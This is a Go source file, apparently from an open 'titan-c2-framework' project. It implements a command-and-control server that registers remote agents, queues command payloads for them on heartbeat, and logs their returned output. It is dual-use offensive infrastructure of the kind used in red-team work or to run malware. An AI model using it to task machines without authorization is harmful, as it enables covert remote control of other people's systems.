package server

import (
	"context"
	"fmt"
	"log"

	"github.com/google/uuid"
	"github.com/user/titan-c2-framework/internal/db"
	"github.com/user/titan-c2-framework/pkg/pb"
)

type C2Server struct {
	pb.UnimplementedC2ServiceServer
}

func NewC2Server() *C2Server {
	return &C2Server{}
}

func (s *C2Server) Register(ctx context.Context, req *pb.RegisterRequest) (*pb.RegisterResponse, error) {
	log.Printf("Registering agent: %s (%s)", req.Hostname, req.Ip)
	
	agentID := uuid.New().String()
	agent := &db.Agent{
		ID:       agentID,
		Hostname: req.Hostname,
		OS:       req.Os,
		IP:       req.Ip,
		Status:   "registered",
	}
	
	db.GlobalStore.AddAgent(agent)
	
	return &pb.RegisterResponse{
		AgentId: agentID,
		Status:  "ok",
	}, nil
}

func (s *C2Server) Heartbeat(ctx context.Context, req *pb.HeartbeatRequest) (*pb.HeartbeatResponse, error) {
	// log.Printf("Heartbeat from: %s", req.AgentId)
	db.GlobalStore.UpdateLastSeen(req.AgentId)
	
	pending := db.GlobalStore.GetPendingCommands(req.AgentId)
	
	var cmds []*pb.Command
	for _, p := range pending {
		cmds = append(cmds, &pb.Command{
			CommandId: p.ID,
			Type:      p.Type,
			Payload:   p.Payload,
		})
	}
	
	return &pb.HeartbeatResponse{
		Commands: cmds,
	}, nil
}

func (s *C2Server) SubmitResult(ctx context.Context, req *pb.CommandResult) (*pb.Ack, error) {
	log.Printf("Result from %s for job %s: %s", req.AgentId, req.CommandId, req.Output)
	db.GlobalStore.UpdateCommandResult(req.CommandId, req.Output, req.Error)
	return &pb.Ack{Success: true}, nil
}

func (s *C2Server) GetJobs(ctx context.Context, req *pb.Empty) (*pb.JobList, error) {
	// Admin API implementation usually goes elsewhere, but reusing protobuf for simplicity here
	return &pb.JobList{}, nil 
}
